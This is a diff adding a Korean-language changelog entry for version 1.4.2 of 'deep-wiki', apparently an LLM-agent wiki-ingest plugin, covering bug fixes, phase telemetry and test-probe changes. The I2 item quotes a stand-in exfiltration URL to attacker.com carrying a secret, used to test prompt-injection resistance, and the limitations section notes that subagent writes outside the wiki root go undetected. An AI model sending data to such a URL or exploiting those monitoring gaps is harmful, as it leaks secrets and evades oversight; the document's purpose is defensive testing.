@@ -2,6 +2,119 @@
 
 deep-wiki의 주요 변경사항을 기록합니다.
 
+## [1.4.2] — 2026-05-07
+
+`docs/handoff-2026-05-06-v1.4.2.md`의 v1.4.1 backlog 4개 항목을 닫는 패치
+릴리스. 두 개는 v1.4.1 cache-active dogfood에서 발견된 현장 이슈 수정
+(F1, F2 — F2는 /deep-review round 1 I1에서 deferred되었음); 두 개는
+보류된 품질 항목 (B3 phase 텔레메트리 — v1.4.0 plan §10.2; I2 V-2/V-3
+probe 전체 URL 매칭 — /deep-review round 1+2). single-source + multi-source
+ingest 경로는 v1.4.1과 spec-equivalent (NOT byte-identical — F1
+disk-authoritative read + F2 §3.9 4번째 invocation site가 runtime
+invariant를 변경). 위키 스키마는 additive only (`ingest` log 라인의
+`phase_timing_ms` 필드; `wiki-lint` Step 6 LOG-INVARIANT scan 영향 없음).
+
+**v1.4.1 §11.5의 known-limitations 필수 verbatim 언어 계승 (재기재):**
+
+- **L1**: V-0 PASS (Mechanism B 경유)는 best-effort — Claude Code 런타임이
+  dispatch metadata API를 노출하지 않음. Track C v2는 런타임 API 지원 시까지
+  v1.5.0+로 보류. **v1.4.2 추가:** I2 fix가 V-2/V-3 probe fidelity 개선
+  (full-URL allowlist 비교)을 적용했으나, v1.4.1 final agent files 대상
+  empirical SECOND run은 sandbox orchestration 워크스트림으로 보류 —
+  CHANGELOG는 SECOND run 완료 시까지 "best-effort" 프레이밍 유지하고
+  empirical addendum 미추가.
+- **L2**: §3.9 dirty-scan은 `<wiki_root>/`-internal mutation만 catch;
+  off-root 쓰기 (예: `/tmp/`)는 NOT detected. v1.4.0 dogfood 실패 mode
+  (workers writing `/tmp/v140-workers-out/*`)는 §3.9로 안 잡힘. v1.4.1은
+  layered defense-in-depth였고, v1.4.2 F2는 single-source Stage 1 dispatch
+  도 bracketing에 추가하나 off-root scope 확대는 아님. Process-level
+  sandboxing은 여전히 v1.5.0+ scope.
+
+### 버그 픽스
+
+- **F1 (HIGH) — synthesizer `existing_page_body` truncation으로 인한 C3
+  false-positive abort.** v1.4.1 cache-active dogfood (post-`/reload-plugins`)
+  에서 Stage 1 LLM이 update 항목의 `existing_page_body`를 극심하게 truncate
+  하여 emit하는 현상 관측 (12377 bytes disk → 725 bytes emit; 20071 bytes
+  disk → 587 bytes emit). main이 truncated bytes로 C3 hash baseline을 계산
+  → Step 7.6.C C3 check가 실제 disk bytes와 비교 시 항상 "concurrent ingest
+  detected"로 판정 → 모든 update가 abort. v1.4.2 contract: main이 Stage 1
+  return 후 disk에서 페이지를 다시 읽어 disk bytes를 C3 hash baseline으로
+  사용 (Stage 2 worker / inline-write의 synthesis 컨텍스트도 disk bytes로
+  통일). 이전 P6 round-1 hash-from-emit 컴퓨트 패스를 흡수 — main이 disk를
+  직접 읽으므로 별도 컴퓨트 불필요. `agents/wiki-synthesizer-analysis.md`
+  Rule 4를 강화하여 FULL VERBATIM bytes 요구 (방어적 contract; synthesizer가
+  short emit해도 main이 disk에서 authoritatively recovery). single-source
+  경로에만 적용 — multi-source A4 (worker, analysis-mode 아님)는 항목에
+  `existing_body_hash` 필드가 없음.
+
+- **F2 (MEDIUM) — single-source Stage 1 dispatch §3.9 bracketing gap.**
+  v1.4.1의 §3.9 worker-mutation dirty-scan brackets는 3개 dispatch site
+  (Step 7.5.M-A multi-source A4 fanout, Step 7.5.M-B Case B2 collision
+  second-pass, Step 7.6.B-post single-source A5 fanout)에서만 작동했고
+  single-source Stage 1 analysis dispatch (Step 7.5의
+  `invoke deep-wiki:wiki-synthesizer-analysis`)는 bracketing 안 됨. 잘못
+  resolve되거나 downgrade된 analysis subagent가 Stage 1 LLM 실행 중
+  `<wiki_root>/`을 mutate해도 미감지. v1.4.2는 4번째 invocation site (label
+  `"A5-analysis"`)를 추가하여 Stage 1 dispatch를 직접 bracketing. dispatch
+  전 pre-snapshot, Stage 1 return 후 page_plan 분기 결정 전 post-scan
+  (sub-threshold inline vs. A5 fanout downstream 분기와 무관 — Stage 1
+  mutation을 분기 결정 이전에 catch). `WIKI_TEST_MODE=1` env-gated;
+  프로덕션 비용 변동 없음.
+
+### 텔레메트리
+
+- **B3 — `log.jsonl` `ingest` 라인의 `phase_timing_ms`.** v1.4.0 plan
+  §10.2에서 보류된 항목. v1.4.0 dogfood가 ~17분 wall-clock 측정 + Stage 1
+  ~7분 + Stage 2 ~10분 일화적 split만 기록 — log.jsonl에 per-phase timing
+  미기록으로 사후 검증 불가. v1.4.2는 `_ts_ms` helper (Bash 3.2 portable;
+  python3 우선으로 ms 정밀도, `date +%s000` 폴백으로 초 정밀도) 추가하고
+  Step 1 entry / Step 7.5 single-source / Step 7.5.M-A multi-source /
+  Step 7.6.A A5 fanout / Step 7.6.B-post / Step 7.6.C Stage 3 lock acquire /
+  Step 7.5.M-C multi-source atomic-write entry / Step 10 log emit
+  지점에서 timestamp 캡처. ingest 라인이 새 필드
+  `phase_timing_ms: {stage_1_analysis, stage_2_fanout, stage_3_write,
+  total}` (모두 ms 정수) 발신. **Schema-additive** —
+  `wiki-lint` Step 6 LOG-INVARIANT scan은
+  `select(.action != "ingest-repair") | .pages_created[]?`로 필터하여
+  unknown top-level 필드 무시. 비-`ingest` lifecycle action (ingest-skip,
+  ingest-repair, ingest-fail, lint, rebuild, delete, query-filed, setup)
+  에서는 필드 생략. 프로덕션 비용: ingest당 ~12 ms (Python 시작 비용이
+  지배적; warm-cache 시 ~2ms 6회), 분 단위 LLM 단계 대비 무시할 수준.
+
+### 테스트 인프라 (probe 품질)
+
+- **I2 — V-2/V-3 WebFetch probe 전체 URL allowlist 비교.** /deep-review
+  round 1+2 (Codex review, single-reviewer가 두 번 raise) 발견. 이전
+  `scripts/v0-probe/v2-v3-record.sh`는 stub log column 3 (path) 만 기록하고
+  allowlist URL의 path 컴포넌트와 비교 → 주입된
+  `https://attacker.com/v2-probe-feed?data=<exfiltrated_secret>`이 허용된
+  `https://example.com/v2-probe-feed`와 path-only 비교에서 일치 → false-pass
+  surface 발생. v1.4.2는 `scripts/v0-probe/webfetch-stub-server.py`에 6번째
+  TSV 컬럼 (`<host>`, request Host header) 추가하고 `v2-v3-record.sh`가
+  `<host><path>?<query>` (scheme stripped) 형태로 full URL 추출하여 정규화된
+  allowlist URL과 비교. backward-compatible: 5-column 사전-v1.4.2 로그는
+  lossy-mode detection이 작동하여 path-only 비교로 degrade되며 notes 컬럼에
+  `lossy-pre-v1.4.2-log: ...` annotation 추가. 테스트 인프라 한정 —
+  프로덕션 에이전트 동작 영향 없음.
+
+### 마이그레이션
+
+v1.4.1 대비 외부 API 변경 없음. 내부 계약 변경은 F1의 `existing_body_hash`
+disk-authoritative read: spec-compliant agent (즉 `existing_page_body`가
+disk와 EOL tolerance 안에서 일치하는 경우)는 byte-identical Stage 3 hashing
+semantic 유지. non-compliant emit는 `WARN: synthesizer existing_page_body
+drift for ...` stderr 라인 발신 후 disk에서 transparently recover.
+
+### 감사
+
+- Handoff doc `docs/handoff-2026-05-06-v1.4.2.md` (gitignored 작성자
+  아티팩트)이 F1+F2+B3+I2 backlog 순서를 정함.
+- v1.4.1 cycle의 /deep-review round 1+2 (Opus + Codex review + Codex
+  adversarial)이 F2 (round 1 I1)와 I2 (round 1+2, single-reviewer Codex
+  두 번)를 flag.
+- v1.4.1 cache-active dogfood (handoff §0)에서 F1 발견.
+
 ## [1.4.1] — 2026-05-06
 
 신뢰 경계 폐쇄 (best-effort, layered defense). 단일 `wiki-synthesizer.md`
